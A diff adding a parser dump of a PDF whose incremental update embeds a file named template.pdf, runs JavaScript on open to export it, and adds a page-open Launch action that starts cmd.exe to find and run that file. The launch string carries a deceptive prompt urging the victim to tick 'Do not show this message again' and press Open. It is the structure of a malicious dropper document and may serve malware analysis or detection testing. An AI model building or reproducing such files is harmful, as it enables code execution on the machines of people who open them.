@@ -1,0 +1,193 @@
+PDF Comment '%PDF-1.0\r\n'
+
+obj 1 0
+ Type: /Catalog
+ Referencing: 2 0 R
+
+  <<
+    /Pages 2 0 R
+    /Type /Catalog
+  >>
+
+
+obj 2 0
+ Type: /Pages
+ Referencing: 3 0 R
+
+  <<
+    /Count 1
+    /Kids [ 3 0 R ]
+    /Type /Pages
+  >>
+
+
+obj 3 0
+ Type: /Page
+ Referencing: 4 0 R, 2 0 R
+
+  <<
+    /Contents 4 0 R
+    /Parent 2 0 R
+    /Resources
+      <<
+        /Font
+          <<
+            /F1
+              <<
+                /Type /Font
+                /Subtype /Type1
+                /BaseFont /Helvetica
+                /Name /F1
+              >>
+          >>
+      >>
+    /Type /Page
+    /MediaBox [ 0 0 795 842 ]
+  >>
+
+
+obj 4 0
+ Type:
+ Referencing:
+ Contains stream
+
+  <<
+    /Length 0
+  >>
+
+
+xref
+
+trailer
+  <<
+    /Root 1 0 R
+    /Size 5
+    /Info 0 0 R
+  >>
+
+startxref 429
+
+PDF Comment '%%EOF\r\n'
+
+obj 5 0
+ Type:
+ Referencing: 6 0 R
+
+  <<
+    /EmbeddedFiles 6 0 R
+  >>
+
+
+obj 6 0
+ Type:
+ Referencing: 7 0 R
+
+  <<
+    /Names [(template)7 0 R]
+  >>
+
+
+obj 7 0
+ Type: /Filespec
+ Referencing: 8 0 R
+
+  <<
+    /UF (template.pdf)
+    /F (template.pdf)
+    /EF
+      <<
+        /F 8 0 R
+      >>
+    /Desc (template)
+    /Type /Filespec
+  >>
+
+
+obj 8 0
+ Type:
+ Referencing:
+ Contains stream
+
+
+
+obj 9 0
+ Type: /Action
+ Referencing:
+
+  <<
+    /S /JavaScript
+    /JS (this.exportDataObject({ cName: "template", nLaunch: 0 });)
+    /Type /Action
+  >>
+
+
+obj 10 0
+ Type: /Action
+ Referencing:
+
+  <<
+    /S /Launch
+    /Type /Action
+    /Win
+      <<
+        /F (cmd.exe)
+        /D '(c:\\\\windows\\\\system32)'
+        /P '(/Q /C %HOMEDRIVE%&cd %HOMEPATH%&(if exist "Desktop\\\\template.pdf" (cd "Desktop"))&(if exist "My Documents\\\\template.pdf" (cd "My Documents"))&(if exist "Documents\\\\template.pdf" (cd "Documents"))&(if exist "Escritorio\\\\template.pdf" (cd "Escritorio"))&(if exist "Mis Documentos\\\\template.pdf" (cd "Mis Documentos"))&(start template.pdf)\n\n\n\n\n\n\n\n\n\nTo view the encrypted content please tick the "Do not show this message again" box and press Open.)'
+      >>
+  >>
+
+
+obj 1 0
+ Type: /Catalog
+ Referencing: 2 0 R, 5 0 R, 9 0 R
+
+  <<
+    /Pages 2 0 R
+    /Names 5 0 R
+    /OpenAction 9 0 R
+    /Type /Catalog
+  >>
+
+
+obj 3 0
+ Type: /Page
+ Referencing: 4 0 R, 2 0 R, 10 0 R
+
+  <<
+    /Contents 4 0 R
+    /Parent 2 0 R
+    /Resources
+      <<
+        /Font
+          <<
+            /F1
+              <<
+                /Type /Font
+                /Subtype /Type1
+                /BaseFont /Helvetica
+                /Name /F1
+              >>
+          >>
+      >>
+    /Type /Page
+    /MediaBox [ 0 0 795 842 ]
+    /AA
+      <<
+        /O 10 0 R
+      >>
+  >>
+
+
+xref
+
+trailer
+  <<
+    /Size 11
+    /Prev 429
+    /Root 1 0 R
+    /Info 0 0 R
+  >>
+
+startxref 45968
+
+PDF Comment '%%EOF\r\n'
